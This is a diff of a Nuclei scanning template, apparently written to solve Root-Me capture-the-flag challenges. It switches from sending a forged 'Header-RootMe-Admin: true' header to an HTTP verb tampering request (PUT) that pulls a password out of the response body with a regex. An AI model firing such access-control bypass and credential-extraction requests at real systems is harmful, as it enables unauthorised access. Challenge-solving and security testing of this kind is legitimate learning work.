@@ -1,18 +1,15 @@
-id: HTTP-Headers
+id: HTTP-VerbTampering
 
 info:
-  name: HTTP Headers
+  name: HTTP Verb Tampering
   author: Tomitom13
   severity: unknown
-  tags: http,headers,rootme
+  tags: verb,tampering,http,rootme
 
 requests:
-  - method: POST
+  - method: PUT
     path:
       - "{{BaseURL}}"
-    headers:
-      Header-RootMe-Admin: "true"
-
     matchers-condition: and
     matchers:
       - type: status
@@ -21,7 +18,7 @@ requests:
 
       - type: word
         words:
-          - "password"
+          - "/ password : "
         part: body
 
     extractors:
@@ -29,4 +26,4 @@ requests:
         name: password
         part: body
         regex:
-          - "password [a-zA-Z0-9!@#$%^&*()_+,.<>?]+"
+          - "password : [a-zA-Z0-9!@#$%^&*()_+,.<>?]+"
